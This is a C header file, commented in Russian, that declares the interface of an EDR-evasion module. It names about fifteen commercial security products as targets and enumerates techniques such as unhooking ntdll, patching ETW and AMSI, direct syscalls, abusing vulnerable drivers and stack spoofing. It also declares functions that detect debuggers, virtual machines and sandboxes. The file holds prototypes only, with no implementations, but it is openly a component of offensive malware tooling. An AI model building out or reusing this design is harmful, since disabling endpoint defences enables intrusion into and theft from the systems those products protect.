/**
 * @file edr_evasion.h
 * @brief Заголовочный файл для модуля обхода EDR (Endpoint Detection and Response)
 * 
 * Данный модуль предоставляет набор функций для обнаружения и обхода
 * современных решений по защите конечных точек (EDR)
 */

#ifndef EDR_EVASION_H
#define EDR_EVASION_H

#include <windows.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/**
 * @brief Типы поддерживаемых EDR решений
 */
typedef enum _EDR_TYPE {
    EDR_TYPE_NONE              = 0x00000000,
    EDR_TYPE_WINDOWS_DEFENDER  = 0x00000001,
    EDR_TYPE_CROWDSTRIKE       = 0x00000002,
    EDR_TYPE_SYMANTEC          = 0x00000004,
    EDR_TYPE_MCAFEE            = 0x00000008,
    EDR_TYPE_CARBON_BLACK      = 0x00000010,
    EDR_TYPE_SENTINEL_ONE      = 0x00000020,
    EDR_TYPE_ESET              = 0x00000040,
    EDR_TYPE_KASPERSKY         = 0x00000080,
    EDR_TYPE_CYLANCE           = 0x00000100,
    EDR_TYPE_SOPHOS            = 0x00000200,
    EDR_TYPE_TREND_MICRO       = 0x00000400,
    EDR_TYPE_PALO_ALTO         = 0x00000800,
    EDR_TYPE_FIREEYE           = 0x00001000,
    EDR_TYPE_BITDEFENDER       = 0x00002000,
    EDR_TYPE_MALWAREBYTES      = 0x00004000,
    EDR_TYPE_CUSTOM            = 0x80000000,
    EDR_TYPE_ALL               = 0xFFFFFFFF
} EDR_TYPE;

/**
 * @brief Поддерживаемые техники обхода
 */
typedef enum _EVASION_TECHNIQUE {
    EVASION_NONE               = 0x00000000,
    EVASION_UNHOOK_NTDLL       = 0x00000001, // Удаление хуков из ntdll.dll
    EVASION_PATCH_ETW          = 0x00000002, // Отключение ETW логирования
    EVASION_PATCH_AMSI         = 0x00000004, // Отключение AMSI
    EVASION_SYSCALL_DIRECT     = 0x00000008, // Прямые системные вызовы
    EVASION_MEMORY_HIDING      = 0x00000010, // Скрытие областей памяти
    EVASION_VULNERABLE_DRIVER  = 0x00000020, // Использование уязвимых драйверов
    EVASION_DLL_UNLINKING      = 0x00000040, // Отвязка DLL из PEB
    EVASION_STACK_SPOOFING     = 0x00000080, // Подмена стека вызовов
    EVASION_PROCESS_TAMPERING  = 0x00000100, // Модификация атрибутов процесса
    EVASION_HARDWARE_BREAKPOINTS = 0x00000200, // Защита от аппаратных точек останова
    EVASION_HEAP_ENCRYPTION    = 0x00000400, // Шифрование кучи
    EVASION_PE_HEADER_REMOVAL  = 0x00000800, // Удаление PE заголовков
    EVASION_SSD_BYPASS         = 0x00001000, // Обход системы самозащиты драйверов
    EVASION_CONTEXT_DETECTION  = 0x00002000  // Обнаружение контекста выполнения
} EVASION_TECHNIQUE;

/**
 * @brief Структура с информацией об обнаруженном EDR
 */
typedef struct _EDR_INFO {
    EDR_TYPE type;                     // Тип EDR
    char name[64];                     // Название EDR
    char process_names[10][64];        // Имена процессов EDR
    char driver_names[10][64];         // Имена драйверов EDR
    char service_names[10][64];        // Имена служб EDR
    BOOL is_active;                    // Активен ли EDR
} EDR_INFO;

/**
 * @brief Структура с результатами обнаружения и обхода EDR
 */
typedef struct _EDR_EVASION_RESULT {
    uint32_t detected_edr_count;                  // Количество обнаруженных EDR
    EDR_INFO detected_edr[16];                    // Информация об обнаруженных EDR
    uint32_t applied_techniques;                  // Примененные техники (битовая маска)
    uint32_t successful_techniques;               // Успешно примененные техники (битовая маска)
    uint32_t failed_techniques;                   // Неудавшиеся техники (битовая маска)
    char error_message[256];                      // Сообщение об ошибке
} EDR_EVASION_RESULT;

/**
 * @brief Конфигурация модуля обхода EDR
 */
typedef struct _EDR_EVASION_CONFIG {
    uint32_t target_edr_mask;                     // Целевые EDR для обхода (битовая маска)
    uint32_t techniques_mask;                     // Используемые техники (битовая маска)
    BOOL enable_automatic_detection;              // Включить автоматическое определение EDR
    BOOL enable_advanced_diagnostics;             // Включить расширенную диагностику
    BOOL restore_hooks_on_exit;                   // Восстанавливать хуки при выходе
} EDR_EVASION_CONFIG;

/**
 * @brief Инициализация модуля обхода EDR
 * 
 * @param config Конфигурация модуля
 * @return TRUE в случае успеха, FALSE в случае ошибки
 */
BOOL EDREvade_Initialize(const EDR_EVASION_CONFIG* config);

/**
 * @brief Обнаружение EDR решений
 * 
 * @param result Структура для сохранения результатов
 * @return TRUE в случае успеха, FALSE в случае ошибки
 */
BOOL EDREvade_DetectEDR(EDR_EVASION_RESULT* result);

/**
 * @brief Применение техник обхода EDR
 * 
 * @param result Структура для сохранения результатов
 * @return TRUE в случае успеха, FALSE в случае ошибки
 */
BOOL EDREvade_ApplyEvasionTechniques(EDR_EVASION_RESULT* result);

/**
 * @brief Обнаружение контекста выполнения (отладчик, виртуальная машина, песочница)
 * 
 * @param is_debugger Указатель для сохранения результата обнаружения отладчика
 * @param is_vm Указатель для сохранения результата обнаружения виртуальной машины
 * @param is_sandbox Указатель для сохранения результата обнаружения песочницы
 * @return TRUE в случае успеха, FALSE в случае ошибки
 */
BOOL EDREvade_DetectExecutionContext(BOOL* is_debugger, BOOL* is_vm, BOOL* is_sandbox);

/**
 * @brief Удаление хуков из ntdll.dll
 * 
 * @return TRUE в случае успеха, FALSE в случае ошибки
 */
BOOL EDREvade_UnhookNtdll(void);

/**
 * @brief Отключение ETW логирования
 * 
 * @return TRUE в случае успеха, FALSE в случае ошибки
 */
BOOL EDREvade_DisableETW(void);

/**
 * @brief Отключение AMSI
 * 
 * @return TRUE в случае успеха, FALSE в случае ошибки
 */
BOOL EDREvade_DisableAMSI(void);

/**
 * @brief Очистка ресурсов модуля обхода EDR
 * 
 * @return TRUE в случае успеха, FALSE в случае ошибки
 */
BOOL EDREvade_Cleanup(void);

#ifdef __cplusplus
}
#endif

#endif /* EDR_EVASION_H */ 